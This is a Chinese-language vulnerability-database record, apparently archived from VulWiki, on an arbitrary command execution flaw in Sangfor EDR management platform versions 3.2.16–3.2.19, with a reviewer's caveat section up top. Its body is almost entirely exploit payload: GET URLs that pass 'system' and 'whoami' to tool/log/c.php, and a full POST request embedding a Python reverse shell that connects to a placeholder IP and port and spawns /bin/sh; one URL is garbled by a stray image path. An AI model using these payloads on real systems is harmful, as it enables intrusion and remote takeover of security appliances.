---
source: "hatch 补库批 20260928"
id: "vw-43e66141cb98e2dec88b8de5"
entity_id: "ve-43e66141cb98e2dec88b8de5"
schema_version: "1"
title: "深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）"
product: "Sangfor EDR管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "3.2.16/17/19；POST含cookie而GET未说明鉴权"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%9B%B8%E5%BA%94%E5%B9%B3%E5%8F%B0%EF%BC%88EDR%EF%BC%89%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
source_status: "unknown"
---

# 深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor EDR管理平台
- 本文讨论：tool/log/c.php strip_slashes命令调用
- 版本、权限与配置前提：3.2.16/17/19；POST含cookie而GET未说明鉴权
- 资料类型：EDR RCE请求残片；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- row URL后粘图片路径尾巴；简介空；Python回连port占位未替换
- 无原始来源/修复，EDR不应混为VPN路由器
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE

### 待核与来源

- 实际鉴权、CNVD映射及版本范围待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


一、漏洞简介
------------

二、漏洞影响
------------

深信服EDR 3.2.16

深信服EDR 3.2.17

深信服EDR 3.2.19

三、复现过程
------------

### payload：

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&limit=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&host=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&path=whoami

    https://www.0-sec.org/tool/log/c.php?strip_slashes=system&row=whoami任意命令执行漏洞(一)/media/rId25.png)

### 反弹shell payload

    POST /tool/log/c.php HTTP/1.1
    Host: www.0-sec.org
    Connection: close
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
    DNT: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded;charset=utf-8
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=b14**************************a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903
    Content-Length: 256

    strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
